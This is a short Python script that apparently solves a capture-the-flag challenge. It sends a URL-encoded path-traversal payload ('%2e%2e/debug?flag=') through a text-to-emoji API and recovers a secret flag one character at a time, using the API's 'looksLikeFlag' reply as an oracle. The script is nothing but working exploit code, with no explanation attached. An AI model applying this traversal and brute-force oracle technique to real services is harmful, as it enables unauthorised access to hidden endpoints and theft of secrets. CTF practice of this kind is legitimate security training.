import requests
from string import ascii_lowercase, digits

chars = ascii_lowercase+digits+"_}"
flag = "FLAG{"

while True:
    for ch in chars:
        guess_flag = flag + ch
        res = requests.post("https://sqlabctf.ddns.net/text2emoji/public_api",
                            json={"text": f"%2e%2e/debug?flag={guess_flag}"}).json()
        if res['looksLikeFlag']:
            flag += ch
            print("[*] current FLAG =", flag)
            if ch == "}":
                print("[+] FLAG found:", flag)
                exit()
            break
